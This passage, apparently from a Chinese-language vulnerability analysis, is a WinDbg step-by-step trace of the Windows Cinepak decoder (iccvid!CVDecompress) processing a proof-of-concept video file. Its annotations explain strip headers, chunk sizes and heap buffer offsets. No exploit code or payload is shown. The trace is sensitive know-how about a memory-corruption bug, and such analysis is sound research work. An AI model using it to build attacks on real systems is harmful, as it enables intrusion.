class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723a1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1f3</span>:</span><br><span class="line">73b723a1 03fa            <span class="keyword">add</span>     <span class="built_in">edi</span>,<span class="built_in">edx</span>                                        <span class="comment">; edi指向第1个CVID Chunk ID,edx为Size of chunk data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723a3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1f5</span>:</span><br><span class="line">73b723a3 3bd0            <span class="keyword">cmp</span>     <span class="built_in">edx</span>,<span class="built_in">eax</span>                                        <span class="comment">; edx为Size of chunk data,判断其是否大于1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723a5 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1f7</span>:</span><br><span class="line">73b723a5 894de8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>],<span class="built_in">ecx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd18=00ba690e <span class="comment">; ecx指向第1个CVID Chunk ID</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723a8 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1fa</span>:</span><br><span class="line">73b723a8 <span class="number">7602</span>            <span class="keyword">jbe</span>     iccvid!CVDecompress+<span class="number">0x1fe</span> (73b723ac)    [br=<span class="number">1</span>] <span class="comment">; 小于等于则跳转，这里跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723ac <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x1fe</span>:</span><br><span class="line">73b723ac <span class="number">294508</span>          <span class="keyword">sub</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd38=<span class="number">00000004</span> <span class="comment">; </span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723af <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x201</span>:</span><br><span class="line">73b723af 837d0804        <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>],<span class="number">4</span>  <span class="built_in">ss</span>:<span class="number">0023</span>:025afd38=<span class="number">00000003</span> <span class="comment">; 判断(Size of strip data减去Strip Header大小后的数据大小-Size of chunk data)是否大于等于4</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723b3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x205</span>:</span><br><span class="line">73b723b3 0f8338ffffff    <span class="keyword">jae</span>     iccvid!CVDecompress+<span class="number">0x143</span> (73b722f1)    [br=<span class="number">0</span>] <span class="comment">; 大于等于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000001</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723b9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x20b</span>:</span><br><span class="line">73b723b9 0fbf450c        <span class="keyword">movsx</span>   <span class="built_in">eax</span>,<span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>]   <span class="built_in">ss</span>:<span class="number">0023</span>:025afd3c=<span class="number">0060</span> <span class="comment">; eax = a2 = 0x60 = (Strips bottom Y position)-(Strips top Y position)</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000060</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723bd <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x20f</span>:</span><br><span class="line">73b723bd 0faf4520        <span class="keyword">imul</span>    <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">20h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd50=<span class="number">00000540</span> <span class="comment">; [(Strips bottom Y position)-(Strips top Y position)]*a7</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0001f800 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723c1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x213</span>:</span><br><span class="line">73b723c1 01451c          <span class="keyword">add</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">1Ch</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd4c=<span class="number">02310050</span> <span class="comment">; [(Strips bottom Y position)-(Strips top Y position)]*a7+a6</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0001f800 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723c4 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x216</span>:</span><br><span class="line">73b723c4 ff45ec          <span class="keyword">inc</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">14h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:025afd1c=<span class="number">00000000</span> <span class="comment">; [ebp-14h]++,coded strip计数器</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0001f800 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723c7 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x219</span>:</span><br><span class="line">73b723c7 8145fc00200000  <span class="keyword">add</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>],<span class="number">2000h</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd2c=<span class="number">00000000</span> <span class="comment">; [ebp-4] = [ebp-4]+0x2000 = 0+0x2000 = 0x2000,堆缓冲区指针偏移</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0001f800 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723ce <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x220</span>:</span><br><span class="line">73b723ce 33ff            <span class="keyword">xor</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span>                                        <span class="comment">; edi = edi^edi = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0001f800 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723d0 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x222</span>:</span><br><span class="line">73b723d0 8b45f8          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd28=<span class="number">00000010</span> <span class="comment">; eax = [ebp-8] = 0x10,Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723d3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x225</span>:</span><br><span class="line">73b723d3 0145f4          <span class="keyword">add</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd24=00ba6902 <span class="comment">; [ebp-0xC] = [ebp-0xC]+0x10 = 0x00ba6912,指向第2个Strip Header;[ebp-0xC] = 0x00ba6902,指向第1个Strip Header</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723d6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x228</span>:</span><br><span class="line">73b723d6 2945f0          <span class="keyword">sub</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">10h</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd20=0000005e <span class="comment">; [ebp-10h] = 0x4e,[ebp-10h]为未解压缩的数据长度，开始时等于PoC中cinepak_codec_data2和idx_tag字节数之和,这里算出剩余未解压缩的数据长度</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723d9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x22b</span>:</span><br><span class="line">73b723d9 03f0            <span class="keyword">add</span>     <span class="built_in">esi</span>,<span class="built_in">eax</span>                                        <span class="comment">; esi指向cinepak_codec_data2(指向第1个Strip Header)，eax为Size of strip data，这里移动数据指针,指向第2个Strip Header</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723db <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x22d</span>:</span><br><span class="line">73b723db 8b45e4          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">1Ch</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd14=<span class="number">00000010</span> <span class="comment">; eax = [ebp-1Ch] = 0x10,Number of coded strips</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723de <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x230</span>:</span><br><span class="line">73b723de 3945ec          <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">14h</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd1c=<span class="number">00000001</span> <span class="comment">; [ebp-14h]为coded strips计数器,eax为Number of coded strips</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723e1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na po cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000283</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x233</span>:</span><br><span class="line">73b723e1 8975e8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>],<span class="built_in">esi</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd18=00ba690e <span class="comment">; [ebp-18h] = esi = 0x00ba6912,指向第2个Strip Header</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b723e4 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na po cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000283</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x236</span>:</span><br><span class="line">73b723e4 0f8c59feffff    <span class="keyword">jl</span>      iccvid!CVDecompress+<span class="number">0x95</span> (73b72243)     [br=<span class="number">1</span>] <span class="comment">; 小于则跳转，这里跳转</span></span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72243 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na po cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000283</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x95</span>:</span><br><span class="line">73b72243 8b45f0          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">10h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd20=0000004e <span class="comment">; [ebp-10h]为剩余未解压缩的数据长度</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72246 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na po cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000283</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x98</span>:</span><br><span class="line">73b72246 83f816          <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="number">16h</span>                                        <span class="comment">; 判断未解压的数据长度是否小于0x16,</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000004e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e 